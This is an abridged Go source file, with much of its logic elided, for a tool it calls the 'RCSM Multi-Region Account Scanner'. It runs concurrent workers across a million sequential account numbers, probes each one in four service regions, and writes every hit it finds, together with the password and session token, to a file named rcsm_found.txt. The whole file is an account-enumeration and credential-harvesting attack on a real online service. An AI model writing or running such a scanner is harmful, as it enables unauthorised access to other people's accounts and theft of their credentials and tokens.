...
func scanAccountAllRegions(userID string) []regionResult {
	regionNames := []string{"SG", "CN", "IN", "EU"}
	...
	for _, rn := range regionNames {
		...
		go func(region string) {
			...
			mu.Lock()
			results = append(results, regionResult{region, bestMsg, bestToken, bestCountry, bestPw})
			mu.Unlock()
		}(rn)
	}
	wg.Wait()
...
func main() {
	start := flag.Int("start", 91000000, "Start account number")
	end := flag.Int("end", 91999999, "End account number")
	workers := flag.Int("workers", 20, "Concurrent workers")
	outFile := flag.String("out", "rcsm_found.txt", "Output file for found accounts")
	flag.Parse()
	...
	fmt.Printf("RCSM Multi-Region Account Scanner\n")
	fmt.Printf("Regions:   SG, CN, IN, EU (all 4 simultaneously)\n")
	...
	for i := 0; i < *workers; i++ {
		...
		go func() {
			defer wg.Done()
			for num := range jobs {
				userID := fmt.Sprintf("%d", num)
				results := scanAccountAllRegions(userID)
				...
				for _, r := range results {
					...
					case "0000":
						...
						line := fmt.Sprintf("[FOUND] %s pw=%s region=%s country=%s token=%s\n",
							userID, r.pw, r.region, r.country, r.token)
						fmt.Print(line)
						fileMu.Lock()
						f.WriteString(line)
						fileMu.Unlock()
